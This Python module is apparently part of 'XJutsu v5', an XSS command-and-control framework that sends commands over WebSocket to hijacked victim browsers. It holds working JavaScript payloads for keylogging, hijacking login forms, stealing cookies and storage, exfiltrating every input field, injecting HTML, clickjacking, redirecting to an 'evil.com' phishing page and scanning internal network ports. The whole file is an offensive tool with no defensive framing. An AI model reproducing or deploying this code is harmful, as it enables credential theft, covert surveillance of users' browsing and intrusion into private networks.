"""
XJutsu v5 - Bot Commands
Send commands to connected XSS bots/browsers
"""

import json
import logging
from channels.layers import get_channel_layer
from asgiref.sync import async_to_sync

logger = logging.getLogger(__name__)


class BotCommander:
    """
    Send commands to connected bots via WebSocket
    """
    
    AVAILABLE_COMMANDS = {
        'eval': {
            'description': 'Execute arbitrary JavaScript',
            'args': ['code'],
            'example': 'alert("XSS")',
        },
        'redirect': {
            'description': 'Redirect the browser to a URL',
            'args': ['url'],
            'example': 'https://evil.com/phishing',
        },
        'screenshot': {
            'description': 'Take a new screenshot',
            'args': [],
            'example': '',
        },
        'collect_page': {
            'description': 'Fetch and collect a page via XHR',
            'args': ['url'],
            'example': '/admin/settings',
        },
        'keylogger_start': {
            'description': 'Start capturing keystrokes',
            'args': [],
            'example': '',
        },
        'keylogger_stop': {
            'description': 'Stop keylogger and send captured data',
            'args': [],
            'example': '',
        },
        'get_cookies': {
            'description': 'Re-capture current cookies',
            'args': [],
            'example': '',
        },
        'get_storage': {
            'description': 'Re-capture localStorage and sessionStorage',
            'args': [],
            'example': '',
        },
        'form_hijack': {
            'description': 'Intercept form submissions',
            'args': ['form_selector'],
            'example': '#login-form',
        },
        'inject_html': {
            'description': 'Inject HTML into the page',
            'args': ['html', 'target_selector'],
            'example': '<div>Injected!</div>',
        },
        'click_jack': {
            'description': 'Simulate a click on element',
            'args': ['selector'],
            'example': '#submit-btn',
        },
        'exfil_input': {
            'description': 'Exfiltrate all input field values',
            'args': [],
            'example': '',
        },
        'port_scan': {
            'description': 'Scan internal ports via img tags',
            'args': ['target_ip', 'ports'],
            'example': '192.168.1.1',
        },
    }
    
    @classmethod
    def send_command(cls, bot_id, command, args=None):
        """
        Send a command to a specific bot
        """
        if args is None:
            args = {}
        
        channel_layer = get_channel_layer()
        
        try:
            async_to_sync(channel_layer.group_send)(
                f'bot_{bot_id}',
                {
                    'type': 'execute_command',
                    'command': command,
                    'args': args
                }
            )
            logger.info(f"Command '{command}' sent to bot {bot_id}")
            return True
        except Exception as e:
            logger.error(f"Failed to send command to bot {bot_id}: {e}")
            return False
    
    @classmethod
    def eval_js(cls, bot_id, code):
        """
        Execute JavaScript code on the bot
        """
        return cls.send_command(bot_id, 'eval', {'code': code})
    
    @classmethod
    def redirect(cls, bot_id, url):
        """
        Redirect the bot's browser
        """
        return cls.send_command(bot_id, 'redirect', {'url': url})
    
    @classmethod
    def take_screenshot(cls, bot_id):
        """
        Request a new screenshot
        """
        return cls.send_command(bot_id, 'screenshot', {})
    
    @classmethod
    def collect_page(cls, bot_id, url):
        """
        Collect a page via XHR
        """
        return cls.send_command(bot_id, 'collect_page', {'url': url})
    
    @classmethod
    def start_keylogger(cls, bot_id):
        """
        Start the keylogger
        """
        code = """
        if(!window.__xjutsu_keylog){
            window.__xjutsu_keylog=[];
            document.addEventListener('keypress',function(e){
                window.__xjutsu_keylog.push({
                    key:e.key,
                    target:e.target.tagName,
                    time:Date.now()
                });
            });
        }
        """
        return cls.eval_js(bot_id, code)
    
    @classmethod
    def stop_keylogger(cls, bot_id):
        """
        Stop keylogger and exfiltrate data
        """
        code = """
        if(window.__xjutsu_keylog){
            ws.send(JSON.stringify({
                type:'keylog',
                data:window.__xjutsu_keylog
            }));
            window.__xjutsu_keylog=[];
        }
        """
        return cls.eval_js(bot_id, code)
    
    @classmethod
    def hijack_forms(cls, bot_id, selector='form'):
        """
        Intercept form submissions
        """
        code = f"""
        document.querySelectorAll('{selector}').forEach(function(form){{
            form.addEventListener('submit',function(e){{
                var data={{}};
                new FormData(form).forEach(function(v,k){{data[k]=v}});
                ws.send(JSON.stringify({{type:'form_data',data:data,action:form.action}}));
            }});
        }});
        """
        return cls.eval_js(bot_id, code)
    
    @classmethod
    def inject_html(cls, bot_id, html, target='body'):
        """
        Inject HTML into page
        """
        # Escape for JS string
        html_escaped = html.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '\\n')
        code = f"document.querySelector('{target}').insertAdjacentHTML('beforeend','{html_escaped}')"
        return cls.eval_js(bot_id, code)
    
    @classmethod
    def exfil_inputs(cls, bot_id):
        """
        Exfiltrate all input values
        """
        code = """
        var inputs={};
        document.querySelectorAll('input,textarea,select').forEach(function(el){
            var name=el.name||el.id||el.className;
            if(name)inputs[name]=el.value;
        });
        ws.send(JSON.stringify({type:'inputs',data:inputs}));
        """
        return cls.eval_js(bot_id, code)
    
    @classmethod
    def internal_port_scan(cls, bot_id, target_ip, ports=None):
        """
        Scan internal network ports
        """
        if ports is None:
            ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5432, 8080, 8443]
        
        ports_str = ','.join(map(str, ports))
        code = f"""
        var target='{target_ip}';
        var ports=[{ports_str}];
        var results={{}};
        ports.forEach(function(port){{
            var img=new Image();
            var start=Date.now();
            img.onload=img.onerror=function(){{
                results[port]=Date.now()-start<100?'open':'closed';
                if(Object.keys(results).length===ports.length){{
                    ws.send(JSON.stringify({{type:'port_scan',target:target,results:results}}));
                }}
            }};
            img.src='http://'+target+':'+port+'/favicon.ico?'+Math.random();
        }});
        """
        return cls.eval_js(bot_id, code)
    
    @classmethod
    def get_available_commands(cls):
        """
        Get list of available commands
        """
        return cls.AVAILABLE_COMMANDS
